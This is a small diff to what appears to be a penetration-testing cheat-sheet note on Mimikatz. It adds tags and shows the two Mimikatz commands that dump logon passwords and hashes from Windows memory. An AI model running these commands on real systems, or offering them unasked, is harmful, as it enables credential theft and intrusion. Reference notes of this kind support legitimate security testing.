@@ -1,3 +1,6 @@
+---
+tags: [ exploit, tool, hash, password ]
+---
 # Mimikatz
 privilege::debug
 sekurlsa::logonpasswords
